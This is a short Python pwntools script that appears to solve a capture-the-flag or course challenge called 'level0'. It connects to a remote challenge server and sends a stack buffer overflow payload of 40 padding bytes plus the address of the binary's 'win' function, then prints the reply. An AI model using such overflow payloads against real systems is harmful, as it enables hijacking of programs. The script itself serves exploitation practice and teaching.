from pwn import *

port = 10004
rem = remote("kayle.snu.ac.kr", port)

elf = ELF("./level0/problem/level0")

win_addr = elf.symbols['win']

payload = b'A' * 40 + p64(win_addr + 1)

rem.recvline()
rem.sendline(payload)
rem.recvline()

print(rem.recvall())
